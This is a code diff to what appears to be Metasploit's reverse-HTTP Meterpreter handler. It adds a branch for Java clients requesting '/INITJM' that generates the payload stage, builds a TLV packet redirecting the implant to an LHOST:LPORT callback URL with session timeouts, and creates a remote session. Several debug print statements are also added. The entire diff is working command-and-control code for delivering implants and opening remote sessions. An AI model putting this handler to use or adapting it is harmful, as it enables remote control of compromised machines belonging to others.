@@ -124,7 +124,40 @@ protected
 
 		# Process the requested resource.
 		case req.relative_resource
+			when /^\/INITJM/
+				$stdout.puts("java: #{req.relative_resource}")
+			
+				conn_id = "CONN_" + Rex::Text.rand_text_alphanumeric(16)
+				url = "http://#{datastore['LHOST']}:#{datastore['LPORT']}/" + conn_id + "/\x00"				
+				$stdout.puts "URL: #{url.inspect}"
+				
+				blob = ""
+				blob << obj.generate_stage
+				
+				# This is a TLV packet - I guess somewhere there should be API for building them
+				# in Metasploit :-)
+				packet = ""
+				packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
+				packet << [url.length+8, 0x1000a].pack('NN')+url
+				packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
+				packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
+				blob << [packet.length+8, 0].pack('NN') + packet
+				
+				resp.body = blob
+				conn_ids << conn_id
+
+				# Short-circuit the payload's handle_connection processing for create_session
+				create_session(cli, {
+					:passive_dispatcher => obj.service,
+					:conn_id            => conn_id,
+					:url                => url,
+					:expiration         => datastore['SessionExpirationTimeout'].to_i,
+					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+					:ssl                => false
+				})
+				
 			when /^\/A?INITM?/
+				$stdout.puts("Win32: #{req.relative_resource}")
 
 				url = ''
 
@@ -180,6 +213,7 @@ protected
 			when /^\/(CONN_.*)\//
 				resp.body = ""
 				conn_id = $1
+				$stdout.puts("Received poll from #{conn_id}")
 
 				if not self.conn_ids.include?(conn_id)
 					print_status("Incoming orphaned session #{conn_id}, reattaching...")
